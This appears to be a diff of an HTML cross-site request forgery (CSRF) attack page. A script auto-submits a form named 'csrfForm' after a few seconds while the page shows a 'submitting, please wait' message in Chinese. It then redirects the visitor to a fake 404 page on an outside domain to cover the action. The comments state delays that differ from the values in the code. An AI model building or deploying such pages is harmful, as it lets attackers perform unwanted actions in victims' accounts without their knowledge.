@@ -51,18 +51,17 @@
 
   <p>⏳ 正在提交，请稍候…</p>
 
-
- <script>
-    // 延迟 3 秒提交表单到 iframe
+  <script>
+    // 提交表单：延迟 3 秒
     setTimeout(() => {
       document.getElementById('csrfForm').submit();
     }, 5000);
 
-    // 延迟 5 秒跳转 404 页面
+    // 页面跳转：延迟 6 秒（确保 iframe 有时间加载响应）
     setTimeout(() => {
       window.location.href = "https://ad721.nb200.net/404.html";
-    }, 5000);
-  </script> 
+    }, 12000);
+  </script>
 
 </body>
 </html>
